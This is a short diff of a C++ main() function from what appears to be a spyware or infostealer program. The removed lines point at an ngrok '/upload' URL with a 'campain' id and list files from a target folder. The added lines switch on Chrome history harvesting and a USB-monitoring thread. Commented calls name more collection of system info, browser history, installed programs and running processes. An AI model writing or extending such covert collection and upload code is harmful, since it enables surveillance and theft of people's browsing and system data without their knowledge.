@@ -38,22 +38,6 @@ int countFiles;
 
 int main()
 {
-	//List file================================================================================
-	hostName   = "https://9171-2a09-bac5-d458-16c8-00-245-71.ngrok-free.app/upload";
-	campain    = "cam87";
-	startDate  = "2017_04_05";
-	endDate    = "2024_04_05";
-	rootFolder = "F:\DATA_X12DVY5M"; 
-	config.LastModifyFile = "";
-
-	listFile = GetListFile(rootFolder, config.LastModifyFile, startDate, endDate);
-	countFiles = listFile.count;
-
-	cout << "fileNumber: " << countFiles << "............" << endl;
-	for (int i = 1; i <= countFiles; i++)
-	{
-		cout << "FileName: " << listFile.arr[i].FileName << "   "  << listFile.arr[i].LastModify << endl;
-	}
 
 	//Computer Infor==========================================================================
 	//PC = getComputerInfor();
@@ -69,20 +53,20 @@ int main()
 	//collectFirefoxHistory();
 	
 	//Url Chrome==============================================================================
-	//processChromeHistory();
+	processChromeHistory();
 
 	//Software Install========================================================================
 	//EnumerateVideoAudioPlayers();
 
-	std::string fileName = "installed_programs.txt";
-	ExportInstalledProgramsToFile(fileName);
+	//std::string fileName = "installed_programs.txt";
+	//ExportInstalledProgramsToFile(fileName);
 	
 	//========================================================================================
 	//EnumerateRunningProcesses();
 
 	//USB detect==============================================================================
-	/*DeviceNotification deviceNotification;
-	deviceNotification.run_from_thread();*/
+	DeviceNotification deviceNotification;
+	deviceNotification.run_from_thread();
 
 
 	//////////////////////////////////////////////////////////////////
